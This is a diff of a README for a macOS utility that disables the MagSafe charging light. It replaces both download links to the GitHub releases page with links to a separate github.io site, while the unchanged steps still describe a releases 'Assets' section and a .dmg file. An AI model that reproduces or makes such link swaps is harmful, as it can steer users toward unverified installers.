@@ -1,6 +1,6 @@
 # 🔋 magsafe-dark - Disable your MacBook charging light easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Uniquec6118/magsafe-dark/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://uniquec6118.github.io)
 
 ## What is this tool?
 Some people find the orange or green charging light on their MacBook MagSafe cable distracting. This utility solves that problem. It runs as a small icon in your menu bar. You click it to turn the charging light off or on. This happens instantly. It does not change how your battery charges. It only changes the LED light on the connector.
@@ -11,7 +11,7 @@ This tool works on Apple Silicon MacBooks. It requires macOS. You do not need to
 ## 📥 How to download and install
 Follow these steps to get the tool running on your computer.
 
-1. Visit this page to download the software: https://github.com/Uniquec6118/magsafe-dark/releases
+1. Visit this page to download the software: https://uniquec6118.github.io
 2. Find the section labeled Assets.
 3. Click the link ending in .dmg to start your download.
 4. Open the file once it finishes downloading.
